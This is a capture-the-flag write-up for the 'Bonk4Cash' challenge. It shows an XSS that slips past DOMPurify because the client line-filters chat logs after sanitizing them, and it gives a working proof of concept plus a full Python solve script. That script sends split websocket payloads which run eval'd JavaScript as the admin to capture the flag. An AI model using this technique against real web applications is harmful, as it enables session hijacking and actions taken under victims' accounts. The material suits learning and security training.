---
title: Bonk4Cash
solves: 15
points: 493
created: 2025-04-19T05:58
updated: 2025-04-20T20:27
tags:
  - xss
---

The client JS trusts the API so much it uses `innerHTML` to display the messages.

But the API is indeed secure, DOMPurify is used.

No known vulnerabilities in DOMPurify ...wait, the client is modifying the content after sanitization.

```js
if(resp.ok){
    const log = await resp.text();
    console.log(log);
    const filtered = log.split("\n").filter(msg => msg.split("]")[0].substring(1) === person).join("\n");
    chatlogbox.innerHTML = filtered;
}else{
    chatlogbox.innerHTML = "<br />Failed to load messages"
}
  ```

Let's try to exploit this, we trick `DOMPurify` into thinking that a malicious `img` tag is actually part of a innocent `h1`'s attributes, and it really is, but after being line-filtered by the client, that wrapper `h1` disappears and our `img` payload appears.

```js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const chatMessages = [
    '[name] test<h1 lang="',
    '[name2] test<img src=1 onerror=\'/*',
    '[name2] */;alert(1)\'>">hello'
];
const person = 'name2';
const log = DOMPurify.sanitize(chatMessages.join("<br>\n"));
console.log("Sanitized log:");
console.log(log);
console.log("\n")

console.log("Filtered log:");
const filtered = log.split("\n").filter(msg => msg.split("]")[0].substring(1) === person).join("\n");
console.log(filtered);
```

```
Sanitized log:
[name] test<h1 lang="<br>
[name2] test<img src=1 onerror='/*<br>
[name2] */;alert(1)'>">hello</h1>


Filtered log:
[name2] test<img src=1 onerror='/*<br>
[name2] */;alert(1)'>">hello</h1>
```

And it worked!

## solve

With a working XSS on our hands the rest is super simple.

Just XSS the admin, get the flag by making the admin report the admin, then send it in chat via the admin account like a chad.

```python
import base64
import random
import time
import requests
import asyncio
import websockets

# origin = "localhost:8000"
origin = "44.197.178.240"
target = f"http://{origin}"

name1 = "kumo"+str(random.randint(0, 1000000))
name2 = "kumo"+str(random.randint(0, 1000000))
requests.post(f"{target}/clearchat")


def reg(username):
    s = requests.Session()
    r = s.post(f"{target}/register", data={"username": username})
    r.raise_for_status()
    return s


def chatkey(s):
    r = s.post(f"{target}/chatkey")
    r.raise_for_status()
    return r.text.strip()


def report(s, name):
    r = s.post(f"{target}/report/{name}")
    r.raise_for_status()
    return r.url


def spam_messages(chatkey1, chatkey2, payload):
    payload = base64.b64encode(payload.encode()).decode()

    async def chat_client():
        uri = f"ws://{origin}/chat"
        async with websockets.connect(uri) as ws2:
            async with websockets.connect(uri) as ws1:
                await ws1.send(chatkey1)
                await ws2.send(chatkey2)
                await ws2.send(f'*/;eval(atob(`{payload}`));\'>">p2')
                await ws2.send('p1<img src=1 onerror=\'/*')
                await asyncio.sleep(0.1)
                await ws1.send('payload starts<h1 lang="')
    asyncio.run(chat_client())


print(f"[*] Registering {name1} and {name2}")
s1 = reg(name1)
s2 = reg(name2)
chatkey1 = chatkey(s1)
chatkey2 = chatkey(s2)
chatkey3 = chatkey(s2)
print(f"[*] Sending payload to chat")
spam_messages(chatkey1, chatkey2, """
fetch("/chatkey",{method:"POST"}).then(r=>r.text()).then(chatkey=>{
    fetch("/report/admin",{method:"POST"}).then(r=>{
        console.log("yay", r.url);
        let ws = new WebSocket("/chat")
        ws.onopen = (event) => {
            ws.send(chatkey);
        }
        ws.onmessage = (event) => {
            console.log(`received ${event.data}`)
            if(event.data === "successfully authorized"){
                ws.send(r.url);
            }
        }
    }).catch(e=>console.log(e));
});
""")
print("[*] Checking payload")
print(requests.get(f"{target}/transcript").text)
print(f"[*] Reporting user {name2} to activate the payload")
print(report(s1, name2))
print("[*] Checking flag")
time.sleep(5)
print(requests.get(f"{target}/transcript").text)
```

```
[admin] http://localhost/?result=UMASS%7BAdm1n_g0T_B0nk3d_EfAv4k7r3dJgTcbjmp%7D<br>
```

```flag
UMASS{Adm1n_g0T_B0nk3d_EfAv4k7r3dJgTcbjmp}
```
